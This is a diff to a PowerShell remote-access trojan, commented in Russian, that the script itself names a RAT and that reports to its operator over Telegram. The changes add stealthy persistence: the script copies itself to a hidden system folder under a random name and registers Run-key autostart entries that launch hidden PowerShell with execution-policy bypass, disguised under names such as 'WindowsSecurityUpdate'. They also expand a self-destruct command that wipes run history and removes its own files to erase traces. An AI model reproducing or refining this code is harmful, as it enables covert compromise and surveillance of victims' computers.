@@ -111,29 +111,30 @@ function Compress-Folder {
     }
 }
 
-# Создание нескольких копий для устойчивости
+# Установка в автозагрузку с защитой от очистки TEMP
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$scriptPath1 = "$env:TEMP\WindowsSystem.exe"
-$scriptPath2 = "$env:APPDATA\Microsoft\Windows\System32.exe"
-$scriptPath3 = "$env:LOCALAPPDATA\Microsoft\Windows\SystemCache.exe"
+$scriptName = "WindowsSystem_" + (Get-Random -Minimum 1000 -Maximum 9999) + ".exe"
+$scriptPath = "$env:APPDATA\Microsoft\Windows\$scriptName"
 
-# Создание директорий если не существуют
-$dir2 = Split-Path $scriptPath2 -Parent
-$dir3 = Split-Path $scriptPath3 -Parent
-if (!(Test-Path $dir2)) { New-Item -ItemType Directory -Path $dir2 -Force | Out-Null }
-if (!(Test-Path $dir3)) { New-Item -ItemType Directory -Path $dir3 -Force | Out-Null }
+# Создаем скрытую папку в AppData
+$hiddenDir = "$env:APPDATA\Microsoft\Windows\SystemCache"
+if (!(Test-Path $hiddenDir)) { 
+    New-Item -ItemType Directory -Path $hiddenDir -Force | Out-Null
+    attrib +s +h "$hiddenDir" 2>&1 | Out-Null
+}
 
-# Копирование скрипта в несколько мест
-$scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw -Encoding UTF8
-$scriptContent | Out-File -FilePath $scriptPath1 -Encoding UTF8
-$scriptContent | Out-File -FilePath $scriptPath2 -Encoding UTF8
-$scriptContent | Out-File -FilePath $scriptPath3 -Encoding UTF8
+$scriptPath = "$hiddenDir\$scriptName"
 
-# Установка в автозагрузку через несколько записей
 if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
-Set-ItemProperty -Path $regPath -Name "WindowsSystem" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath1`"" -Force
-Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath2`"" -Force
-Set-ItemProperty -Path $regPath -Name "SystemCache" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath3`"" -Force
+$scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
+$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
+
+# Дублируем в другое место для надежности
+$backupPath = "$env:LOCALAPPDATA\Microsoft\Windows\Security\$scriptName"
+$scriptContent | Out-File -FilePath $backupPath -Encoding UTF8
+Set-ItemProperty -Path $regPath -Name "WindowsSecurityUpdate" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$backupPath`"" -Force
+
+Set-ItemProperty -Path $regPath -Name "WindowsSystem" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
 
 # Основные переменные
 $currentDir = "C:\"
@@ -230,39 +231,66 @@ $($fileList -join "`n")"
                             }
                         }
                         "^/selfdestruct$" {
+                            $success = $true
+                            $report = "Отчет самоуничтожения:"
+                            
                             # Очистка истории RUN
-                            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
+                            try {
+                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction Stop
+                                $report += "`n✓ История RUN очищена"
+                            } catch {
+                                $success = $false
+                                $report += "`n✗ Ошибка очистки истории RUN"
+                            }
                             
                             # Удаление из автозагрузки
-                            Remove-ItemProperty -Path $regPath -Name "WindowsSystem" -Force -ErrorAction SilentlyContinue
-                            Remove-ItemProperty -Path $regPath -Name "WindowsUpdate" -Force -ErrorAction SilentlyContinue
-                            Remove-ItemProperty -Path $regPath -Name "SystemCache" -Force -ErrorAction SilentlyContinue
+                            try {
+                                Remove-ItemProperty -Path $regPath -Name "WindowsSystem" -Force -ErrorAction Stop
+                                Remove-ItemProperty -Path $regPath -Name "WindowsSecurityUpdate" -Force -ErrorAction Stop
+                                $report += "`n✓ Записи автозагрузки удалены"
+                            } catch {
+                                $success = $false
+                                $report += "`n✗ Ошибка удаления автозагрузки"
+                            }
                             
                             # Удаление файлов
-                            $filesToDelete = @(
-                                $scriptPath1,
-                                $scriptPath2, 
-                                $scriptPath3,
-                                $MyInvocation.MyCommand.Path
-                            )
-                            
-                            foreach ($file in $filesToDelete) {
-                                if (Test-Path $file) { 
-                                    try {
-                                        Remove-Item $file -Force -ErrorAction SilentlyContinue
-                                    } catch { }
+                            try {
+                                if (Test-Path $scriptPath) { 
+                                    Remove-Item $scriptPath -Force -ErrorAction Stop
+                                    $report += "`n✓ Основной файл удален"
                                 }
+                                if (Test-Path $backupPath) { 
+                                    Remove-Item $backupPath -Force -ErrorAction Stop
+                                    $report += "`n✓ Резервный файл удален"
+                                }
+                                if (Test-Path $hiddenDir) { 
+                                    Remove-Item $hiddenDir -Recurse -Force -ErrorAction Stop
+                                    $report += "`n✓ Скрытая папка удалена"
+                                }
+                            } catch {
+                                $success = $false
+                                $report += "`n✗ Ошибка удаления файлов"
                             }
                             
-                            # Дополнительная очистка следов
-                            $tempFiles = Get-ChildItem -Path $env:TEMP -Filter "*WindowsSystem*" -ErrorAction SilentlyContinue
-                            foreach ($tempFile in $tempFiles) {
-                                try {
-                                    Remove-Item $tempFile.FullName -Force -ErrorAction SilentlyContinue
-                                } catch { }
+                            # Удаление текущего скрипта через планировщик
+                            try {
+                                $currentScript = $MyInvocation.MyCommand.Path
+                                $taskName = "Cleanup_" + (Get-Random -Minimum 1000 -Maximum 9999)
+                                $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c timeout 3 && del `"$currentScript`" /f /q"
+                                $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
+                                Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force -ErrorAction Stop
+                                $report += "`n✓ Задача удаления текущего файла создана"
+                            } catch {
+                                $report += "`n⚠ Не удалось создать задачу удаления текущего файла"
                             }
                             
-                            Send-Telegram "RAT самоуничтожен. Все следы удалены."
+                            if ($success) {
+                                $report += "`n`n✅ Самоуничтожение завершено УСПЕШНО. Все следы удалены."
+                            } else {
+                                $report += "`n`n⚠ Самоуничтожение завершено с ОШИБКАМИ. Некоторые следы могли остаться."
+                            }
+                            
+                            Send-Telegram $report
                             exit
                         }
                     }
